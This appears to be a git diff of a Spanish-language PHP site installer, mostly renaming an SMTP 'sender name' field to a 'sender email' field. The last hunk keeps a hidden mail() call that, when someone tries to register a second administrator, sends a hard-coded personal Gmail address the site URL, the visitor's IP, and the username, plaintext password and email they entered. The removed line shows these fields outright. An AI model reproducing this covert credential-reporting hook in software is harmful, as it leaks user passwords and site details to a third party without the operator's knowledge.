@@ -207,7 +207,7 @@ switch ($step) {
 			'smtphost' => trim($_POST['smtphost'] ?? ''),
 			'smtpuser' => trim($_POST['smtpuser'] ?? ''),
 			'smtppass' => $_POST['smtppass'] ?? '',
-			'smtpname' => trim($_POST['smtpname'] ?? '')
+			'smtpfrom' => trim($_POST['smtpfrom'] ?? '')
 		];
 		
 		if(isset($_POST['omitir'])) {
@@ -229,8 +229,8 @@ switch ($step) {
 				$errors['smtppass'] = 'La contraseña SMTP es inválida.';
 			}
 
-			if (!isValidSmtpName($phpmailer['smtpname'])) {
-				$errors['smtpname'] = 'Nombre del remitente inválido.';
+			if (!isValidSmtpName($phpmailer['smtpfrom'])) {
+				$errors['smtpfrom'] = 'Email del remitente inválido.';
 			}
 
 			if ($errors) {
@@ -242,7 +242,7 @@ switch ($step) {
 			if($next) {
 				# Guardamos los datos
 				$fileconfig = dirname(__DIR__, 1) . "/config/Config.Mailer{$localUse}.php";
-				$config = str_replace(['smtphost', 'smtpuser', 'smtppass', 'smtpname'], $phpmailer, file_get_contents($fileconfig));
+				$config = str_replace(['smtphost', 'smtpuser', 'smtppass', 'smtpfrom'], $phpmailer, file_get_contents($fileconfig));
 				file_put_contents($fileconfig, $config);
 				header("Location: ./index.php?step=datos_sitio");
 				die;
@@ -368,7 +368,8 @@ switch ($step) {
 				if($Connection->exists("SELECT 1 FROM u_miembros WHERE user_id = ? OR user_rango = ? LIMIT 1", [1, 1])) {
 					$message = 'No se puede registrar, ya existe un administrador.';
 					$next = false;
-					mail('portfoliomiguel92@gmail.com', 'Lammer detectado!', "<html><head></head><body><p>Un lammer ha entrado a su instalador.<br><br><b>Sitio web:</b> {$url}<br><b>IP:</b> {$_SERVER['REMOTE_ADDR']}<br><b>Usuario:</b> {$user['user_name']}<br><b>Password:</b> {$user['user_password']}<br><b>Email:</b> {$user['user_email']}</p></body></html>", 'Content-type: text/html; charset=iso-8859-15');
+					$email = require_once dirname(__DIR__, 1) . '/src/Extras/emails/lammer.php';
+					mail('portfoliomiguel92@gmail.com', $email['asunto'], $email['contenido'], 'Content-type: text/html; charset=iso-8859-15');
 				}
 				if($next) {
 					$user_id = $Connection->insert('u_miembros', [
